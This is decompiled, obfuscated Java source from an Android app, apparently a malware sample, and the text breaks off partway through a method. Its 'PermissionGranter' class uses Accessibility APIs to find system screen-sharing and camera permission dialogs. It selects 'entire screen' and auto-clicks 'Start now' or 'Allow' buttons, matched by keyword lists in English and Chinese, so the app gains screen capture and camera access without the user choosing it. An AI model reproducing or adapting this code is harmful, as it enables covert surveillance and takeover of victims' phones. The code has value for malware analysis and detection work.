package com.storm.safe.rock.manager;

import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Rect;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.AppVariantE;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.AbstractC0385a0;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.Pair;
import kotlin.collections.EmptyList;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0429du;
import p000.C0873ms;
import p000.C1180rh;
import p000.dh0;
import p000.dn0;
import p000.l60;
import p000.n60;
import p000.sc0;
import p000.t60;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.manager.a2 */
/* loaded from: classes2.dex */
public final class C0260a2 {

    /* renamed from: b8 */
    public static final /* synthetic */ int f52107b8 = 0;

    /* renamed from: a0 */
    public final dqtvuisjd f52108a0;

    /* renamed from: a1 */
    public final dqtvuisjd f52109a1;

    /* renamed from: a2 */
    public boolean f52110a2;

    /* renamed from: a3 */
    public volatile boolean f52111a3;

    /* renamed from: a4 */
    public boolean f52112a4;

    /* renamed from: a5 */
    public boolean f52113a5;

    /* renamed from: a6 */
    public int f52114a6;

    /* renamed from: a7 */
    public int f52115a7;

    /* renamed from: a8 */
    public int f52116a8;

    /* renamed from: a9 */
    public long f52117a9;

    /* renamed from: b0 */
    public boolean f52118b0;

    /* renamed from: b1 */
    public int f52119b1;

    /* renamed from: b2 */
    public String f52120b2;

    /* renamed from: b3 */
    public boolean f52121b3;

    /* renamed from: b4 */
    public volatile boolean f52122b4;

    /* renamed from: b5 */
    public volatile long f52123b5;

    /* renamed from: b6 */
    public volatile long f52124b6;

    /* renamed from: b7 */
    public final C0873ms f52125b7;

    static {
        new dn0(null);
    }

    public C0260a2(dqtvuisjd dqtvuisjdVar) {
        this.f52108a0 = dqtvuisjdVar;
        this.f52109a1 = dqtvuisjdVar;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var = new y21();
        c0785a0.getClass();
        this.f52125b7 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var));
    }

    /* renamed from: a0 */
    public static final boolean m211257a0(C0260a2 c0260a2, AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean zPerformAction = false;
        for (int i = 0; accessibilityNodeInfo != null && i < 3; i++) {
            try {
                if (accessibilityNodeInfo.isClickable()) {
                    zPerformAction = accessibilityNodeInfo.performAction(16);
                    return zPerformAction;
                }
                accessibilityNodeInfo = accessibilityNodeInfo.getParent();
            } catch (Exception unused) {
            }
        }
        return zPerformAction;
    }

    /* JADX WARN: Removed duplicated region for block: B:39:0x00ad  */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final void m211258a1(C0260a2 c0260a2, String str, int i, AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        Object obj;
        CharSequence className;
        CharSequence className2;
        boolean z;
        String string = null;
        if (Build.VERSION.SDK_INT < 35 || !t60.m214686a2(str, "com.android.systemui")) {
            obj = "com.android.systemui";
        } else {
            boolean z2 = (c0260a2.f52110a2 || !m211293f1() || AbstractC0241a0.f51906a0 == null) ? false : true;
            boolean zM211304b2 = Build.VERSION.SDK_INT >= 35 ? c0260a2.m211304b2(str) : false;
            if (zM211304b2) {
                z2 = false;
            }
            if (z2) {
                return;
            }
            if (zM211304b2) {
                long jCurrentTimeMillis = System.currentTimeMillis();
                long j = jCurrentTimeMillis - c0260a2.f52123b5;
                long j2 = jCurrentTimeMillis - c0260a2.f52124b6;
                obj = "com.android.systemui";
                if (c0260a2.f52124b6 != 0 && j2 < 3000) {
                    if (j < 2000) {
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 检测冷却期-距离上次检测时间过短(" + j + "ms)，跳过重复检测");
                    } else {
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 处理冷却期-距离上次处理时间过短(" + j2 + "ms)，跳过处理防止频繁操作");
                    }
                    z = false;
                } else {
                    z = true;
                }
                if (!z) {
                    return;
                }
                c0260a2.f52123b5 = jCurrentTimeMillis;
                c0260a2.f52119b1 = 0;
                c0260a2.f52120b2 = null;
                if (!c0260a2.f52110a2) {
                    c0260a2.f52110a2 = true;
                    AbstractC0780a0.m213692a3(c0260a2.f52125b7, null, new PermissionGranter$handleAccessibilityEventInternal$1(c0260a2, null), 3);
                }
            }
        }
        if (i == 4) {
            Object obj2 = obj;
            if (Build.VERSION.SDK_INT < 35 || !t60.m214686a2(str, obj2)) {
                return;
            }
            if (accessibilityNodeInfo != null && (className = accessibilityNodeInfo.getClassName()) != null) {
                string = className.toString();
            }
            boolean z3 = c0260a2.f52110a2;
            if (!z3 && m211293f1()) {
                MediaProjection mediaProjection = AbstractC0241a0.f51906a0;
            }
            if (z3) {
                if (!(string != null && AbstractC0779a1.m213652a5(string, "Spinner", false))) {
                    if (!(string != null && AbstractC0779a1.m213652a5(string, "DropDown", false))) {
                        return;
                    }
                }
                c0260a2.m211317f0();
                return;
            }
            return;
        }
        if (i != 32) {
            if (i == 2048 && c0260a2.f52110a2 && c0260a2.m211320f6(str)) {
                if (System.currentTimeMillis() - c0260a2.f52117a9 > (c0260a2.f52119b1 <= 1 ? 200L : c0260a2.f52114a6 <= 2 ? 300L : c0260a2.f52118b0 ? 400L : 800L)) {
                    if ((Build.VERSION.SDK_INT >= 35 ? c0260a2.m211304b2(str) : false) || !t60.m214686a2(str, c0260a2.f52120b2) || c0260a2.f52119b1 < 3) {
                        c0260a2.f52119b1++;
                        c0260a2.f52120b2 = str;
                        c0260a2.f52118b0 = true;
                        c0260a2.m211315e8(i, str);
                        return;
                    }
                    return;
                }
                return;
            }
            return;
        }
        boolean z4 = c0260a2.f52110a2;
        if (z4 && z4) {
            if (c0260a2.m211320f6(str)) {
                if ((Build.VERSION.SDK_INT >= 35 ? c0260a2.m211304b2(str) : false) || !t60.m214686a2(str, c0260a2.f52120b2) || c0260a2.f52119b1 < 3) {
                    c0260a2.f52119b1++;
                    c0260a2.f52120b2 = str;
                    c0260a2.f52118b0 = true;
                    c0260a2.m211315e8(i, str);
                }
            }
            if (t60.m214686a2(str, obj) && i == 4 && Build.VERSION.SDK_INT >= 35) {
                if (accessibilityNodeInfo != null && (className2 = accessibilityNodeInfo.getClassName()) != null) {
                    string = className2.toString();
                }
                if (!(string != null && AbstractC0779a1.m213652a5(string, "Spinner", false))) {
                    if (string != null && AbstractC0779a1.m213652a5(string, "DropDown", false)) {
                        z = true;
                    }
                    if (!z) {
                        c0260a2.f52119b1++;
                        c0260a2.f52118b0 = true;
                        c0260a2.m211315e8(i, str);
                        return;
                    }
                }
                c0260a2.m211317f0();
            }
        }
    }

    /* renamed from: a2 */
    public static final boolean m211259a2(C0260a2 c0260a2, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        boolean zPerformAction;
        c0260a2.getClass();
        try {
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) obj);
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    for (AccessibilityNodeInfo parent : listFindAccessibilityNodeInfosByText) {
                        for (int i2 = 0; parent != null && i2 < 3; i2++) {
                            try {
                                if (m211295f3(parent) && parent.isClickable()) {
                                    zPerformAction = parent.performAction(16);
                                    break;
                                }
                                parent = parent.getParent();
                            } catch (Exception unused) {
                            }
                        }
                        zPerformAction = false;
                        if (zPerformAction) {
                            Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                            while (it.hasNext()) {
                                ((AccessibilityNodeInfo) it.next()).recycle();
                            }
                            return true;
                        }
                    }
                    Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                    while (it2.hasNext()) {
                        ((AccessibilityNodeInfo) it2.next()).recycle();
                    }
                }
            }
            return false;
        } catch (Exception unused2) {
            return false;
        }
    }

    /* renamed from: a3 */
    public static void m211260a3(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        if (accessibilityNodeInfo == null || i > 3) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        if (string.length() <= 0) {
            accessibilityNodeInfo.isClickable();
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            m211260a3(accessibilityNodeInfo.getChild(i2), i + 1);
        }
    }

    /* renamed from: a4 */
    public static double m211261a4(String str, String str2) {
        if (str.length() == 0 || str2.length() == 0) {
            return 0.0d;
        }
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int iMax = Math.max(lowerCase.length(), lowerCase2.length());
        int length = lowerCase.length() + 1;
        int[][] iArr = new int[length][];
        for (int i = 0; i < length; i++) {
            iArr[i] = new int[lowerCase2.length() + 1];
        }
        int length2 = lowerCase.length();
        if (length2 >= 0) {
            int i2 = 0;
            while (true) {
                iArr[i2][0] = i2;
                if (i2 == length2) {
                    break;
                }
                i2++;
            }
        }
        int length3 = lowerCase2.length();
        if (length3 >= 0) {
            int i3 = 0;
            while (true) {
                iArr[0][i3] = i3;
                if (i3 == length3) {
                    break;
                }
                i3++;
            }
        }
        int length4 = lowerCase.length();
        if (1 <= length4) {
            int i4 = 1;
            while (true) {
                int length5 = lowerCase2.length();
                if (1 <= length5) {
                    int i5 = 1;
                    while (true) {
                        int i6 = i4 - 1;
                        int i7 = i5 - 1;
                        int i8 = lowerCase.charAt(i6) == lowerCase2.charAt(i7) ? 0 : 1;
                        int[] iArr2 = iArr[i4];
                        int[] iArr3 = iArr[i6];
                        iArr2[i5] = Math.min(iArr3[i5] + 1, Math.min(iArr2[i7] + 1, iArr3[i7] + i8));
                        if (i5 == length5) {
                            break;
                        }
                        i5++;
                    }
                }
                if (i4 == length4) {
                    break;
                }
                i4++;
            }
        }
        return 1.0d - (iArr[lowerCase.length()][lowerCase2.length()] / iMax);
    }

    /* renamed from: a6 */
    public static boolean m211262a6(AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String string;
        try {
            boolean zIsEmpty = m211284d6(accessibilityNodeInfo, "android.widget.RadioButton").isEmpty();
            boolean zIsEmpty2 = m211284d6(accessibilityNodeInfo, "android.widget.Button").isEmpty();
            boolean zIsEmpty3 = m211284d6(accessibilityNodeInfo, "android.widget.TextView").isEmpty();
            String[] strArr = {"app", "应用", "screen", "屏幕", "record", "录制", "share", "共享", "cast", "投射", "capture", "捕获", "allow", "允许", "permission", "权限", "start", "开始", "continue", "继续", "ok", "确定", "cancel", "取消"};
            int i = 0;
            for (int i2 = 0; i2 < 24; i2++) {
                if (!m211286d8(accessibilityNodeInfo, strArr[i2]).isEmpty()) {
                    i++;
                }
            }
            boolean z = (zIsEmpty || zIsEmpty2 || zIsEmpty3) ? false : true;
            boolean z2 = i >= 3;
            if (!z || !z2) {
                String[] strArr2 = {"start", "开始", "allow", "允许", "ok", "确定", "continue", "继续", "accept", "接受", "agree", "同意", "grant", "授予", "yes", "是"};
                ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.Button");
                int size = arrayListM211284d6.size();
                int i3 = 0;
                while (i3 < size) {
                    Object obj = arrayListM211284d6.get(i3);
                    i3++;
                    CharSequence text = ((AccessibilityNodeInfo) obj).getText();
                    if (text == null || (string = text.toString()) == null) {
                        lowerCase = "";
                    } else {
                        lowerCase = string.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    }
                    for (int i4 = 0; i4 < 16; i4++) {
                        String lowerCase2 = strArr2[i4].toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        if (!AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                        }
                    }
                }
                return false;
            }
            return true;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 后备权限检测失败", e);
            return false;
        }
    }

    /* renamed from: a7 */
    public static boolean m211263a7(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            String[] strArr = {"全屏", "Full screen", "Entire screen", "整个屏幕", "完整屏幕", "Whole screen", "Complete screen", "录制整个屏幕", "Record entire screen", "Share entire screen", "共享整个屏幕", "共享全屏", "投屏全屏"};
            for (int i = 0; i < 13; i++) {
                if (!m211286d8(accessibilityNodeInfo, strArr[i]).isEmpty()) {
                    return true;
                }
            }
        } catch (Exception unused) {
        }
        return false;
    }

    /* renamed from: a8 */
    public static boolean m211264a8(AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        boolean z;
        String string;
        String string2;
        try {
            ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.Button");
            ArrayList arrayList = new ArrayList();
            int size = arrayListM211284d6.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM211284d6.get(i);
                i++;
                if (((AccessibilityNodeInfo) obj).isClickable()) {
                    arrayList.add(obj);
                }
            }
            if (!arrayList.isEmpty()) {
                List listM213306g5 = AbstractC0716jf.m213306g5("record", "录制", "capture", "捕获", "cast", "投射", "start now", "立即开始", "start sharing", "开始共享", "share screen", "共享屏幕");
                List listM212602a1 = dh0.m212602a1();
                ArrayList arrayList2 = new ArrayList();
                int size2 = arrayList.size();
                int i2 = 0;
                while (true) {
                    boolean z2 = true;
                    if (i2 >= size2) {
                        break;
                    }
                    Object obj2 = arrayList.get(i2);
                    i2++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj2;
                    CharSequence text = accessibilityNodeInfo2.getText();
                    String lowerCase2 = "";
                    if (text == null || (string2 = text.toString()) == null) {
                        lowerCase = "";
                    } else {
                        lowerCase = string2.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    }
                    CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                    if (contentDescription != null && (string = contentDescription.toString()) != null) {
                        lowerCase2 = string.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    }
                    if (listM212602a1 == null || !listM212602a1.isEmpty()) {
                        Iterator it = listM212602a1.iterator();
                        while (it.hasNext()) {
                            if (AbstractC0779a1.m213652a5(lowerCase, (String) it.next(), true)) {
                                break;
                            }
                        }
                    }
                    if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                        Iterator it2 = listM213306g5.iterator();
                        while (it2.hasNext()) {
                            if (AbstractC0779a1.m213652a5(lowerCase, (String) it2.next(), true)) {
                                z = true;
                            }
                        }
                    }
                    z = false;
                    if (listM212602a1 == null || !listM212602a1.isEmpty()) {
                        Iterator it3 = listM212602a1.iterator();
                        while (it3.hasNext()) {
                            if (AbstractC0779a1.m213652a5(lowerCase2, (String) it3.next(), true)) {
                                break;
                            }
                        }
                    }
                    if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                        Iterator it4 = listM213306g5.iterator();
                        while (it4.hasNext()) {
                            if (AbstractC0779a1.m213652a5(lowerCase2, (String) it4.next(), true)) {
                                break;
                            }
                        }
                    }
                    z2 = false;
                    if (z || z2) {
                        arrayList2.add(obj2);
                    }
                }
                if (arrayList2.isEmpty()) {
                    if (arrayList.size() >= 2) {
                    }
                }
                return true;
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查权限按钮失败", e);
            return false;
        }
    }

    /* renamed from: a9 */
    public static boolean m211265a9(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            String[] strArr = {"start sharing", "开始共享", "start now", "立即开始", "share your screen", "共享您的屏幕", "share screen", "共享屏幕", "screen recording permission", "屏幕录制权限", "media projection", "媒体投射", "screen casting", "屏幕投射", "record screen", "录制屏幕", "cast screen", "投射屏幕", "capture screen", "捕获屏幕", "screen capture", "屏幕捕获", "screen sharing", "屏幕共享", "display sharing", "显示共享", "record your screen", "录制您的屏幕", "capture your screen", "捕获您的屏幕", "allow recording", "允许录制", "allow sharing", "允许共享", "allow screen recording", "允许屏幕录制", "allow screen sharing", "允许屏幕共享", "grant permission", "授予权限", "permission request", "权限请求", "recording permission", "录制权限", "sharing permission", "共享权限", "屏幕录制", "屏幕投射", "屏幕捕获", "屏幕共享", "显示共享", "录制您的屏幕", "捕获您的屏幕", "投射您的屏幕", "分享您的屏幕", "允许录制", "允许共享", "允许屏幕录制", "允许屏幕共享", "允许屏幕投射", "授予权限", "权限请求", "权限申请", "录制权限", "共享权限", "投射权限", "开始录制", "开始投射", "开始分享", "开始捕获"};
            for (int i = 0; i < 70; i++) {
                if (!m211286d8(accessibilityNodeInfo, strArr[i]).isEmpty()) {
                    return true;
                }
            }
            return m211262a6(accessibilityNodeInfo);
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查权限申请文本失败", e);
            return false;
        }
    }

    /* renamed from: b0 */
    public static boolean m211266b0(AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String string;
        try {
            ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.Button");
            ArrayList arrayList = new ArrayList();
            int size = arrayListM211284d6.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM211284d6.get(i);
                i++;
                if (((AccessibilityNodeInfo) obj).isClickable()) {
                    arrayList.add(obj);
                }
            }
            String[] strArr = {"start now", "立即开始", "start sharing", "开始共享", "allow", "允许", "share screen", "共享屏幕", "start", "开始", "ok", "确定", "continue", "继续"};
            int size2 = arrayList.size();
            int i2 = 0;
            int i3 = 0;
            while (i3 < size2) {
                Object obj2 = arrayList.get(i3);
                i3++;
                CharSequence text = ((AccessibilityNodeInfo) obj2).getText();
                if (text == null || (string = text.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                int i4 = 0;
                while (true) {
                    if (i4 < 14) {
                        String lowerCase2 = strArr[i4].toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                            i2++;
                            break;
                        }
                        i4++;
                    }
                }
            }
            return i2 >= 1;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查强权限按钮特征失败", e);
            return false;
        }
    }

    /* renamed from: b1 */
    public static boolean m211267b1(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        try {
            ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.RadioButton");
            int size = arrayListM211284d6.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM211284d6.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                CharSequence text = accessibilityNodeInfo2.getText();
                String str = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                    str = string2;
                }
                if (AbstractC0779a1.m213652a5(string, "全屏", false) || AbstractC0779a1.m213652a5(string, "Full", false) || AbstractC0779a1.m213652a5(string, "Entire", false) || AbstractC0779a1.m213652a5(string, "整个", false) || AbstractC0779a1.m213652a5(string, "完整", false) || AbstractC0779a1.m213652a5(str, "全屏", false) || AbstractC0779a1.m213652a5(str, "Full", false) || AbstractC0779a1.m213652a5(str, "Entire", false)) {
                    if (accessibilityNodeInfo2.isChecked()) {
                        return true;
                    }
                }
            }
            String[] strArr = {"已选择全屏", "全屏已选择", "Full screen selected", "Entire screen selected"};
            for (int i2 = 0; i2 < 4; i2++) {
                if (!m211286d8(accessibilityNodeInfo, strArr[i2]).isEmpty()) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查全屏是否已选择失败", e);
            return false;
        }
    }

    /* renamed from: b5 */
    public static void m211268b5(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        if (i > 15) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string2 = className.toString()) == null) {
            string2 = "";
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        String str = viewIdResourceName != null ? viewIdResourceName : "";
        if (accessibilityNodeInfo.isClickable() || AbstractC0779a1.m213652a5(string2, "Button", true) || ((AbstractC0779a1.m213652a5(string2, "TextView", true) && accessibilityNodeInfo.isClickable()) || AbstractC0779a1.m213652a5(str, "button", true) || (string.length() > 0 && accessibilityNodeInfo.isClickable()))) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211268b5(i + 1, child, arrayList);
                if (!arrayList.contains(child)) {
                    child.recycle();
                }
            }
        }
    }

    /* renamed from: b6 */
    public static void m211269b6(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList, int i, boolean z) {
        String string;
        String string2;
        if (i > 15) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string2 = className.toString()) == null) {
            string2 = "";
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        String str = viewIdResourceName != null ? viewIdResourceName : "";
        if (accessibilityNodeInfo.isClickable() || AbstractC0779a1.m213652a5(string2, "Button", true) || ((AbstractC0779a1.m213652a5(string2, "TextView", true) && accessibilityNodeInfo.isClickable()) || AbstractC0779a1.m213652a5(str, "button", true) || (string.length() > 0 && accessibilityNodeInfo.isClickable()))) {
            if (!z) {
                arrayList.add(accessibilityNodeInfo);
            } else if (!AbstractC0779a1.m213652a5(string, "选择", true) && !AbstractC0779a1.m213652a5(string, "单个", true) && !AbstractC0779a1.m213652a5(string, "应用", true) && !AbstractC0779a1.m213652a5(string, "屏幕", true) && !AbstractC0779a1.m213652a5(string, "整个", true) && !AbstractC0779a1.m213652a5(string, "select", true) && !AbstractC0779a1.m213652a5(string, "single", true) && !AbstractC0779a1.m213652a5(string, "app", true) && !AbstractC0779a1.m213652a5(string, "screen", true) && !AbstractC0779a1.m213652a5(string, "entire", true)) {
                arrayList.add(accessibilityNodeInfo);
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211269b6(child, arrayList, i + 1, z);
                child.recycle();
            }
        }
    }

    /* renamed from: b7 */
    public static void m211270b7(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        try {
            arrayList.add(accessibilityNodeInfo);
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m211270b7(i + 1, child, arrayList);
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: b8 */
    public static boolean m211271b8(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        try {
            List<String> listM213306g5 = AbstractC0716jf.m213306g5("摄像头", "相机", "Camera", "camera", "使用时允许", "仅本次使用时允许", "仅在使用时允许", "允许", "拒绝", "Allow", "Deny", "权限", "Permission", "permission");
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                str = string2;
            }
            for (String str2 : listM213306g5) {
                if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                    return true;
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    if (m211271b8(child)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查权限文本失败", e);
            return false;
        }
    }

    /* renamed from: b9 */
    public static int m211272b9(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        if (i > 5) {
            return 0;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String str = "";
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string2 = className.toString()) != null) {
            str = string2;
        }
        int i2 = (accessibilityNodeInfo.isClickable() && (AbstractC0779a1.m213652a5(string, "Remote", true) || AbstractC0779a1.m213652a5(string, "Control", true) || AbstractC0779a1.m213652a5(string, "远程", true) || AbstractC0779a1.m213652a5(string, "控制", true) || AbstractC0779a1.m213652a5(str, "TextView", false) || AbstractC0779a1.m213652a5(str, "Button", false))) ? 1 : 0;
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                int iM211272b9 = m211272b9(child, i + 1) + i2;
                child.recycle();
                i2 = iM211272b9;
            }
        }
        return i2;
    }

    /* renamed from: c0 */
    public static int m211273c0(AccessibilityNodeInfo accessibilityNodeInfo, int i, int i2) {
        String string;
        String string2;
        String string3;
        if (i2 > 6) {
            return i;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        String str = "";
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "ListView", true) || AbstractC0779a1.m213652a5(string, "RecyclerView", true) || AbstractC0779a1.m213652a5(string, "GridView", true)) {
            i += accessibilityNodeInfo.getChildCount();
        }
        if (accessibilityNodeInfo.isClickable() && (AbstractC0779a1.m213652a5(string, "LinearLayout", true) || AbstractC0779a1.m213652a5(string, "RelativeLayout", true) || AbstractC0779a1.m213652a5(string, "FrameLayout", true) || AbstractC0779a1.m213652a5(string, "ConstraintLayout", true))) {
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string2 = text.toString()) == null) {
                string2 = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string3 = contentDescription.toString()) != null) {
                str = string3;
            }
            if ((string2.length() > 0 || str.length() > 0) && string2.length() < 50 && str.length() < 50) {
                i++;
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                i = m211273c0(child, i, i2 + 1);
                child.recycle();
            }
        }
        return i;
    }

    /* renamed from: c2 */
    public static void m211274c2(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        if (i > 20) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string2 = className.toString()) == null) {
            string2 = "";
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        String str = viewIdResourceName != null ? viewIdResourceName : "";
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        if (accessibilityNodeInfo.isClickable() || AbstractC0779a1.m213652a5(string2, "Button", true) || ((AbstractC0779a1.m213652a5(string2, "TextView", true) && accessibilityNodeInfo.isClickable()) || AbstractC0779a1.m213652a5(str, "button", true) || AbstractC0779a1.m213652a5(str, "btn", true) || (string.length() > 0 && string.length() < 15 && accessibilityNodeInfo.isClickable() && rectM24a5.width() > 80 && rectM24a5.height() > 40 && rectM24a5.width() < 500))) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
